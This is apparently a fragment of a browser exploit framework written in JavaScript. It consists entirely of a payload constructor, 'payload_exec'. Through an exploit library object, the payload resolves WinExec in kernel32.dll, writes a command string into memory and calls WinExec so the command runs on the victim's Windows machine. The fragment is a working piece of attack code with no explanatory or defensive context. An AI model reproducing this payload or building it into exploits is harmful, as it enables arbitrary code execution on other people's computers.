function payload_exec(cmd) {

	this.execute = function(explib) {
	
		var winexec = explib.resolveAPI( 'kernel32.dll', 'WinExec' );
		var c = explib.allocateString( cmd );
		
		explib.callAPI( winexec, c, 5 )  
	}

	return this;
}